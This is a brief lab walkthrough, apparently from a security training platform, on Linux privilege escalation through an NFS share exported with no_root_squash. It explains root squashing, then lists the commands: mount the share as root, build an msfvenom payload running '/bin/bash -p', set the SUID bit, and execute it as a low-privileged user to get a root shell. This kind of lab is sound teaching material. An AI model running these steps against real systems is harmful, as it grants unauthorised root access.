Exploiting NFS
==============

THEORY:

ROOT SQUASHING:
Root squash is an administrative feature that adds an additional layer of file access control on top of the current network-based access control and 
POSIX file permissions.

 Using the root squash feature, you can restrict root level access from clients that try to access your FSx for Lustre file system as root.
 
 ** A: Root squash is a special mapping that maps remote root user (uid 0) to local "nobody" user (uid 65534), which has minimal privileges. **
 
 (a) Files created via NFS inherit the remote user's ID.
 
 LAB:
 
 1. Check the NFS share configuration on the Debian VM:
 
 cat /etc/exports
 
 Will get following:
 
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)

Explanation:

Note that the /tmp share has root squashing disabled.

2. In attackbox:
switch to root user.

sudo su

3. as root user of attackbox:
(a) mkdir /tmp/nfs
(b) mount -o rw,vers=3 DEBIAN_VM_IM:/tmp /tmp/nfs
( creates a mount point on AttackBox and mount the /tmp share (update the IP accordingly) )

4. In the attackbox:
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

(It generates a payload and save it in the mounted share )

5. To make the file executable and set SUID bit
chmod +xs /tmp/nfs/shell.elf

6.In the Debian VM as low privileged user:
/tmp/shell.elf

get the root shell.




